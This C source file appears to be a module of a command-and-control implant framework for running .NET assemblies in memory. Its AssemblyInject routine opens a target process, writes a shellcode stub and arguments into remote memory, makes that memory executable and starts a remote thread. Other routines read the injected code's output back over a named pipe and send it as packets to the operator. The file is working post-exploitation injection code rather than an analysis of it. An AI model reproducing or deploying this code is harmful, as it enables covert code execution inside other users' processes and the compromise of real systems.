#include "../../common.h"
#include "../include/KaineDef.h"
#include "ScAssemblyEnter.h"

HRESULT (WINAPI *ScAssemblyEnter)(
    _In_ PARG_CTX
) = core_stub_bin;

ULONG ScAssemblyLength = sizeof( core_stub_bin );

__forceinline
ULONG64 KnSharedTimeStamp(
    VOID
) {
    LARGE_INTEGER TimeStamp = {
        .LowPart	= USER_SHARED_DATA->SystemTime.LowPart,
        .HighPart	= USER_SHARED_DATA->SystemTime.High1Time
    };

    return TimeStamp.QuadPart;
}

VOID KnSleepShared(
    _In_ ULONG64 MilliSec
) {
    ULONG64	Start = KnSharedTimeStamp() + ( MilliSec * 10000 );

    for ( SIZE_T RandomNmbr = 0x00; KnSharedTimeStamp() < Start; RandomNmbr++ );

    if ( ( KnSharedTimeStamp() - Start ) > 2000 ) {
        return;
    }
}

/*!
 * @brief
 *  routine function that gets executed each time the
 *  agent finished and leaves the tasking routine
 *
 * @param Ctx
 *  context to be passed to the routine
 */
VOID KnRoutine(
    _In_ PROUTINE_CTX Ctx
) {
    ULONG    Tries  = { 5 };
    ULONG    Length = { 0 };
    PVOID    Output = { 0 };
    NTSTATUS Status = { 0 };
    ULONG    OfsRet = { 0 };
    BUFFER   Packet = { 0 };
    PTEB     Teb    = NtCurrentTeb();

    //
    // create a packet that we are going to send back
    //
    KnPackerHeader( &Packet, Ctx->PacketId, KAINE_CALLBACK_IO );
    OfsRet = KnPackerAddRaw( &Packet, NULL, sizeof( NTSTATUS ) );

    if ( Ctx->Flags.IsInjected && ! Ctx->Pipe ) {
        //
        // try to connect to the named pipe
        // for a number of tries
        //
        do {
            //
            // connect to the named pipe
            //
            if ( ( Ctx->Pipe = CreateFileW(
                Ctx->PipeName.Buffer.w,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
                NULL
            ) ) != INVALID_HANDLE_VALUE ) {
                break;
            }

            //
            // delay execution a bit
            //
            KnSleepShared( 100 );
        } while ( --Tries );

        //
        // if we still didn't connect to it then it means it
        // is not available, and we should just quit the routine
        //
        if ( ! Ctx->Pipe ) {
            Teb->LastErrorValue = ERROR_PIPE_NOT_CONNECTED;
            goto END;
        }
    }

    //
    // read from the named pipe
    //
    if ( PeekNamedPipe( Ctx->Pipe, NULL, 0, NULL, &Length, NULL ) && Length ) {
        //
        // allocate an empty space for the output
        //
        Output = KnPackerOffsetToPointer( &Packet, KnPackerAddEmpty( &Packet, Length ) );

        //
        // read the output from the pipe and write
        // it into the allocate empty buffer
        //
        if ( ! ReadFile( Ctx->Pipe, Output, Length, &Length, 0 ) ) {
            Status = Teb->LastErrorValue;
        }
    } else {
        Status = Teb->LastErrorValue;
    }

END:
    //
    // no more things to read. free up the injected memory and remove
    // the registered routine since we no longer need it to be executed
    //
    if ( Status == ERROR_PIPE_NOT_CONNECTED ||
         Status == ERROR_BROKEN_PIPE        )
    {
        //
        // remove the routine, so it won't be
        // executed anymore at the next iteration
        //
        KnRoutineRemove( KnRoutine, Ctx );

        //
        // update the status to be an NT type status
        // which is easier for the scripts to display
        //
        Status = Status == ERROR_PIPE_NOT_CONNECTED ? STATUS_PIPE_DISCONNECTED : STATUS_PIPE_BROKEN;

        //
        // free memory and close process handle
        //
        KnVirtualFree( Ctx->Process, Ctx->Memory.Buffer.p, 0 );
        CloseHandle( Ctx->Process );

        //
        // free ctx memory
        //
        MmClean( Ctx, sizeof( ROUTINE_CTX ) + Ctx->PipeName.Length )
    }

    KnPackerUpdateOffset( &Packet, OfsRet, &Status, sizeof( NTSTATUS ) );

    //
    // only send something when we read
    // something from the pipe
    //
    if ( Length || ! NT_SUCCESS( Status ) ) {
        KnPacketSend( &Packet );
    }

    MmBufferClean( &Packet );
}

VOID AssemblyInject(
    _In_ PVOID   Argv,
    _In_ ULONG   Argc,
    _In_ PBUFFER Buffer,
    _In_ ULONG   Packet
) {
    datap        Parser     = { 0 };
    ARG_CTX      Ctx        = { 0 };
    HRESULT      Result     = { 0 };
    PROUTINE_CTX RoutineCtx = { 0 };
    ULONG        Protect    = { 0 };
    ULONG        Offset     = { 0 };
    ULONG        Pid        = { 0 };
    HANDLE       Process    = { 0 };
    PVOID        Memory     = { 0 };
    ULONG        Length     = { 0 };
    PVOID        Param      = { 0 };
    HANDLE       Thread     = { 0 };

    MmZero( &Ctx, sizeof( ARG_CTX ) );

    //
    // parse arguments
    //
    BeaconDataParse( &Parser, Argv, Argc );
    Pid                           = BeaconDataInt( &Parser );
    Length                        = Parser.length;
    Param                         = Parser.buffer;
    Ctx.Flags.Value               = BeaconDataInt( &Parser );
    Ctx.Invoke.Assembly.Buffer.p  = BeaconDataExtract( &Parser, &Ctx.Invoke.Assembly.Length  );
    Ctx.Invoke.Arguments.Buffer.p = BeaconDataExtract( &Parser, &Ctx.Invoke.Arguments.Length );
    Ctx.Invoke.AppDomain.Buffer.p = BeaconDataExtract( &Parser, &Ctx.Invoke.AppDomain.Length );
    Ctx.Invoke.Version.Buffer.p   = BeaconDataExtract( &Parser, &Ctx.Invoke.Version.Length   );
    Ctx.Invoke.PipeName.Buffer.p  = BeaconDataExtract( &Parser, &Ctx.Invoke.PipeName.Length  );

    //
    // allocate memory space for
    // the Result value
    //
    Offset = KnPackerAddRaw( Buffer, NULL, sizeof( Result ) );

    //
    // open process handle
    //
    if ( ! NT_SUCCESS( Result = KnProcessOpen( &Process, Pid, PROCESS_ALL_ACCESS, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnProcessOpen Failed: %lx", Result );
        goto END;
    }

    //
    // allocate remote process memory
    //
    Length += ScAssemblyLength;
    if ( ! NT_SUCCESS( Result = KnVirtualAlloc( Process, &Memory, Length, PAGE_READWRITE, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnVirtualAlloc Failed: %lx", Result );
        goto END;
    }

    //
    // write payload into remote process
    //
    if ( ! NT_SUCCESS( Result = KnVirtualWrite( Process, Memory, ScAssemblyEnter, ScAssemblyLength, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnVirtualWrite Failed: %lx", Result );
        goto END;
    }

    //
    // write argument into remote process
    //
    if ( ! NT_SUCCESS( Result = KnVirtualWrite( Process, Memory + ScAssemblyLength, Param, Length - ScAssemblyLength, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnVirtualWrite Failed: %lx", Result );
        goto END;
    }

    //
    // change protection of remote process memory
    //
    Protect = PAGE_EXECUTE_READ;
    if ( ! NT_SUCCESS( Result = KnVirtualProtect( Process, Memory, Length, &Protect, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnVirtualProtect Failed: %lx", Result );
        goto END;
    }

    Param = C_PTR( U_PTR( Memory ) + ScAssemblyLength );

    //
    // execute remote process memory
    //
    if ( ! NT_SUCCESS( Result = KnThreadCreate( Process, Memory, Param, &Thread, 0 ) ) ) {
        BeaconPrintf( KAINE_CALLBACK_DEBUG, "KnThreadCreate Failed: %lx", Result );
        goto END;
    }

    //
    // try to connect to the named pipe
    //
    if ( Ctx.Flags.Pipe ) {
        //
        // allocate memory for the routine argument
        //
        if ( ! ( RoutineCtx = KnHeapAlloc( sizeof( ROUTINE_CTX ) + Ctx.Invoke.PipeName.Length ) ) ) {
            Result = STATUS_INSUFFICIENT_RESOURCES;
            goto END;
        }

        //
        // prepare routine ctx argument
        //
        RoutineCtx->Flags             = Ctx.Flags;
        RoutineCtx->PacketId          = Packet;
        RoutineCtx->PipeName.Length   = Ctx.Invoke.PipeName.Length;
        RoutineCtx->PipeName.Buffer.u = U_PTR( RoutineCtx ) + sizeof( ROUTINE_CTX );
        RoutineCtx->Memory.Buffer.p   = Memory;
        RoutineCtx->Memory.Length     = Length;
        RoutineCtx->Process           = Process;
        MmCopy( RoutineCtx->PipeName.Buffer.p, Ctx.Invoke.PipeName.Buffer.p, Ctx.Invoke.PipeName.Length );

        //
        // register routine
        //
        KnRoutineRegister( KnRoutine, RoutineCtx );
    }

END:
    KnPackerUpdateOffset( Buffer, Offset, &Result, sizeof( Result ) );

    if ( Process && ! NT_SUCCESS( Result ) ) {
        CloseHandle( Process );
    }

    if ( Ctx.Return.IoPipe.Read ) {
        CloseHandle( Ctx.Return.IoPipe.Read );
    }
}

/*!
 * @brief
 *
 *  AssemblyMisc is a function that does following things:
 *      - List loaded app domains and it's loaded assemblies
 *      - List runtime versions
 *      - Unload specified app domain
 *
 *  Merely a function that does all those things above to keep
 *  the code minimal
 *
 * @param Argv
 *  Arguments passed to the function
 *
 * @param Argc
 *  Arguments
 *
 * @param Buffer
 *  return buffer
 */
VOID AssemblyMisc(
    _In_ PVOID   Argv,
    _In_ ULONG   Argc,
    _In_ PBUFFER Buffer
) {
    datap       Parser     = { 0 };
    ARG_CTX     Ctx        = { 0 };
    HRESULT     Result     = { 0 };
    ULONG       Offset     = { 0 };

    MmZero( &Ctx, sizeof( ARG_CTX ) );

    //
    // parse arguments
    //
    BeaconDataParse( &Parser, Argv, Argc );
    Ctx.Flags.Value           = BeaconDataInt( &Parser );
    Ctx.Misc.Version.Buffer.p = BeaconDataExtract( &Parser, &Ctx.Misc.Version.Length );
    Ctx.Misc.Domain.Buffer.p  = BeaconDataExtract( &Parser, &Ctx.Misc.Domain.Length  );

    Ctx.Misc.AddBytes = KnPackerAddBytes;
    Ctx.Return.Buffer = Buffer;

    //
    // allocate memory space for
    // the Result value
    //
    Offset = KnPackerAddRaw( Buffer, NULL, sizeof( Result ) );

    //
    // invoke the dotnet stub to list data from the CLR
    // and save the result to the allocated memory
    //
    Result = ScAssemblyEnter( &Ctx );
    KnPackerUpdateOffset( Buffer, Offset, &Result, sizeof( Result ) );
}

VOID AssemblyInvoke(
    _In_ PVOID   Argv,
    _In_ ULONG   Argc,
    _In_ PBUFFER Buffer
) {
    datap       Parser     = { 0 };
    ARG_CTX     Ctx        = { 0 };
    ULONG       Result     = { 0 };
    ULONG       Length     = { 0 };
    ULONG       Read       = { 0 };
    ULONG       Offset     = { 0 };
    PVOID       Output     = { 0 };

    MmZero( &Ctx, sizeof( ARG_CTX ) );

    //
    // parse arguments
    //
    BeaconDataParse( &Parser, Argv, Argc );

    Ctx.Flags.Value               = BeaconDataInt( &Parser );
    Ctx.Invoke.Assembly.Buffer.p  = BeaconDataExtract( &Parser, &Ctx.Invoke.Assembly.Length  );
    Ctx.Invoke.Arguments.Buffer.p = BeaconDataExtract( &Parser, &Ctx.Invoke.Arguments.Length );
    Ctx.Invoke.AppDomain.Buffer.p = BeaconDataExtract( &Parser, &Ctx.Invoke.AppDomain.Length );
    Ctx.Invoke.Version.Buffer.p   = BeaconDataExtract( &Parser, &Ctx.Invoke.Version.Length   );

    //
    // allocate memory space for
    // the Result value
    //
    Offset = KnPackerAddRaw( Buffer, NULL, sizeof( Result ) );

    //
    // invoke/execute assembly in current process
    //
    if ( ( Result = ScAssemblyEnter( &Ctx ) ) ) {
        goto END;
    }

    //
    // get size of the pipe
    //
    if ( Ctx.Flags.Pipe && PeekNamedPipe( Ctx.Return.IoPipe.Read, NULL, 0, NULL, &Length, NULL ) && Length ) {
        //
        // allocate an empty space for the output
        //
        Output = KnPackerOffsetToPointer( Buffer, KnPackerAddEmpty( Buffer, Length ) );

        //
        // read the output from the pipe and write
        // it into the allocate empty buffer
        //
        if ( ! ReadFile( Ctx.Return.IoPipe.Read, Output, Length, &Read, 0 ) ) {
            Result = NtCurrentTeb()->LastErrorValue;
            goto END;
        }
    }

END:
    KnPackerUpdateOffset( Buffer, Offset, &Result, sizeof( Result ) );
    NtCurrentPeb()->ProcessParameters->StandardOutput = Ctx.Return.IoPipe.StdoutBkg;

    if ( Ctx.Return.IoPipe.Write ) {
        CloseHandle( Ctx.Return.IoPipe.Write );
    }

    if ( Ctx.Return.IoPipe.Read ) {
        CloseHandle( Ctx.Return.IoPipe.Read );
    }

    MmZero( &Ctx, sizeof( ARG_CTX ) );
}